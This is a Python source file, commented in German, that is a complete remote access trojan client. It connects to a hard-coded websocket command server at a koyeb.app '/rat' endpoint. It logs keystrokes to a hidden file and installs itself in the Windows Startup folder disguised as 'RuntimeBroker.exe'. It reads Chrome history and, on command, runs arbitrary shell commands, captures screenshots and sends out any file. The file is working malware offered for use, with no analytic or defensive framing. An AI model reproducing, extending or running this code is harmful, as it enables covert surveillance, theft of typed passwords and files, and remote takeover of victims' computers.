import asyncio
import websockets
import json
import subprocess
import os
import base64
import mss
import platform
import sqlite3
import shutil
import sys
from datetime import datetime, timedelta  # KORRIGIERTE ZEILE

# pynput wird für den Keylogger benötigt
try:
    from pynput import keyboard
except ImportError:
    print("[!] pynput ist nicht installiert. Keylogger-Funktion nicht verfügbar.")
    keyboard = None

SERVER_URI = "ws://yawning-chameleon-norobb-e4dabbb0.koyeb.app:80/rat"
KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")


# --- Keylogger-Funktionen (unverändert) ---
def on_press_persistent(key):
    special_key_map = {
        keyboard.Key.enter: f" [<<<{datetime.now().strftime('%H:%M:%S')}>>>]\n",
        keyboard.Key.space: " ",
        keyboard.Key.backspace: "[BS]",
        keyboard.Key.tab: "[Tab]",
        keyboard.Key.ctrl: "[CTRL]",
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt: "[ALT]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.shift: "",
        keyboard.Key.shift_l: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.cmd: "[CMD]",
        keyboard.Key.cmd_l: "[CMD]",
        keyboard.Key.cmd_r: "[CMD]",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
        keyboard.Key.delete: "[DEL]",
        keyboard.Key.insert: "[INS]",
    }
    log_entry = ""
    try:
        log_entry = key.char
    except AttributeError:
        log_entry = special_key_map.get(key, f"[{key.name}]")
    if log_entry:
        try:
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception:
            pass


def start_persistent_keylogger():
    if not keyboard:
        return
    header = f"\n--- SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    try:
        with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(header)
    except Exception as e:
        print(f"[!] Fehler beim Schreiben des Log-Headers: {e}")
    listener = keyboard.Listener(on_press=on_press_persistent)
    listener.daemon = True
    listener.start()
    print(f"[+] Persistenter Keylogger gestartet. Log-Datei: {KEYLOG_FILE_PATH}")


# --- Andere Funktionen (unverändert) ---
def ensure_persistence():
    if platform.system() != "Windows":
        return
    startup_filename = "RuntimeBroker.exe"
    source_path = sys.executable
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    dest_path = os.path.join(startup_folder, startup_filename)
    if source_path.lower() == dest_path.lower():
        return
    if not os.path.exists(dest_path):
        try:
            os.makedirs(startup_folder, exist_ok=True)
            shutil.copyfile(source_path, dest_path)
        except Exception:
            pass


def get_browser_history(limit: int = 20):
    history_db_path = None
    system = platform.system()
    if system == "Windows":
        history_db_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Default",
            "History",
        )
    elif system == "Darwin":
        history_db_path = os.path.join(
            os.path.expanduser("~"),
            "Library",
            "Application Support",
            "Google",
            "Chrome",
            "Default",
            "History",
        )
    elif system == "Linux":
        history_db_path = os.path.join(
            os.path.expanduser("~"),
            ".config",
            "google-chrome",
            "Default",
            "History",
        )
    if not history_db_path or not os.path.exists(history_db_path):
        return "[FEHLER] Chrome-Verlaufsdatenbank nicht gefunden."
    temp_db_path = "History_copy.db"
    shutil.copyfile(history_db_path, temp_db_path)
    conn = None
    output = ""
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        query = f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit};"
        cursor.execute(query)

        def get_chrome_datetime(chromedate):
            # Diese Zeile benötigt 'timedelta'
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

        results = [
            f"Eintrag {i+1}:\n  Zeit:    {get_chrome_datetime(row[2]).strftime('%d.%m.%Y %H:%M:%S')}\n  Titel:   {row[1]}\n  URL:     {row[0]}\n"
            + "-" * 40
            for i, row in enumerate(cursor.fetchall())
        ]
        output = "\n".join(results)
    except Exception as e:
        output = f"[FEHLER] Konnte Verlauf nicht lesen: {e}"
    finally:
        if conn:
            conn.close()
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)
    return output if output else "Keine Verlaufseinträge gefunden."


async def process_commands(websocket):
    async for message in websocket:
        try:
            command = json.loads(message)
            action = command.get("action")
            response = {"status": "ok"}
            if action == "exec":
                cmd_to_run = command.get("command")
                result = subprocess.run(
                    cmd_to_run,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="ignore",
                )
                response["type"] = "command_output"
                response["output"] = result.stdout + result.stderr
            elif action == "screenshot":
                with mss.mss() as sct:
                    sct.shot(output="screenshot.png")
                    with open("screenshot.png", "rb") as img_file:
                        encoded_string = base64.b64encode(
                            img_file.read()
                        ).decode("utf-8")
                    os.remove("screenshot.png")
                    response["type"] = "screenshot"
                    response["data"] = encoded_string
            elif action == "download":
                path = command.get("path")
                if os.path.exists(path) and os.path.isfile(path):
                    with open(path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    response["type"] = "file_download"
                    response["filename"] = os.path.basename(path)
                    response["data"] = file_data
                else:
                    response["status"] = "error"
                    response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
            elif action == "history":
                limit = command.get("limit", 20)
                response["type"] = "command_output"
                response["output"] = get_browser_history(limit)
            elif action == "keylogger":
                if not keyboard:
                    response["status"] = "error"
                    response["error"] = "pynput ist auf dem Client nicht installiert."
                elif not os.path.exists(KEYLOG_FILE_PATH):
                    response["type"] = "command_output"
                    response["output"] = "Keylog-Datei existiert noch nicht."
                else:
                    count = command.get("count", 1000)
                    with open(KEYLOG_FILE_PATH, "rb") as f:
                        f.seek(0, os.SEEK_END)
                        filesize = f.tell()
                        seek_pos = max(0, filesize - int(count * 1.5))
                        f.seek(seek_pos)
                        last_chunk = f.read().decode("utf-8", errors="ignore")
                        output = last_chunk[-count:]
                    response["type"] = "command_output"
                    response["output"] = (
                        f"Die letzten {len(output)} Zeichen aus der Log-Datei "
                        f"({filesize / 1024:.2f} KB):\n{output}"
                    )
            else:
                response["status"] = "error"
                response["error"] = "Unbekannte Aktion"
            await websocket.send(json.dumps(response))
        except Exception as e:
            error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
            try:
                await websocket.send(json.dumps(error_response))
            except Exception:
                pass


async def connect_to_server():
    ensure_persistence()
    start_persistent_keylogger()
    while True:
        try:
            async with websockets.connect(SERVER_URI) as websocket:
                print("[+] Verbunden mit dem Server.")
                await process_commands(websocket)
        except (websockets.ConnectionClosed, ConnectionRefusedError):
            await asyncio.sleep(10)
        except Exception:
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(connect_to_server())